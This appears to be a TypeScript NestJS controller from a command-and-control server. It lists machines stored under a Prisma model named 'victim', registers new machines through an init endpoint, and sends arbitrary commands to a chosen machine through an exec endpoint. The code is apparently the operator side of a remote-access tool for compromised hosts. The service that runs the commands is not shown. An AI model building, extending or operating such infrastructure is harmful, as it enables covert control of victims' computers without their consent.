import { Body, Controller, Get, Post, Query } from '@nestjs/common';
import { InitMachineDto } from './dtos/main';
import { MachinesService } from './machines.service';
import { victim } from '@prisma/client';

@Controller('machines')
export class MachinesController {
  constructor(private readonly machinesService: MachinesService) {}

  @Get()
  async findAll(): Promise<victim[]> {
    return await this.machinesService.findAll();
  }

  @Post('init')
  async init(@Body() payload: InitMachineDto): Promise<boolean> {
    return await this.machinesService.init(payload);
  }

  @Post('exec')
  async execute(
    @Query('machine_id') machine_id: string,
    @Body('command') command: string,
  ): Promise<boolean> {
    return await this.machinesService.execute(machine_id, command);
  }
}
